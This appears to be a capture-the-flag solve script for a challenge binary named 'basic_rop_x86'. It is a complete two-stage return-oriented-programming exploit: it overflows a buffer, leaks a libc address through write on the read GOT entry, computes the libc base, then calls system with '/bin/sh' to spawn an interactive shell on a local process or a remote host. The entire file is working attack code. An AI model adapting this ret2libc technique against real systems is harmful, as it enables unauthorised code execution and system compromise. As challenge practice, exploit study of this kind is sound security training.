#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./basic_rop_x86_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

	pop_three_ret = 0x08048689
	pop_one_ret = 0x080483d9
	# read_plt = exe.plt['read']
	# read_got = exe.got['read']
	# puts_plt = exe.plt['puts']
	# write_plt = exe.plt['write']
	# main = exe.sym['main']

	# Stage 1: Leak libc address

	# write(1,read@got,0x40)
	pl = b'A' * 0x48
	pl += p32(exe.plt.write)
	pl += p32(exe.sym.main)
	pl += p32(0x1)
	pl += p32(exe.got.read)
	pl += p32(0x40)

	s(pl)

	ru(b'A'*0x40)
	leak_libc = u32(rnb(4))
	libc.address = leak_libc - libc.sym.read
	slog("Libc leak",leak_libc)
	slog("Libc base", libc.address)
	slog("System", libc.sym.system)
	slog("/bin/sh", next(libc.search(b'/bin/sh')))
	sleep(1)
	# Stage 2: Get shell

	pl2 = b'B' * 0x48
	pl2 += p32(libc.sym.system)
	pl2 += p32(0)   
	pl2 += p32(next(libc.search(b'/bin/sh')))
	s(pl2)

	interactive()

if __name__ == '__main__':
    exploit()
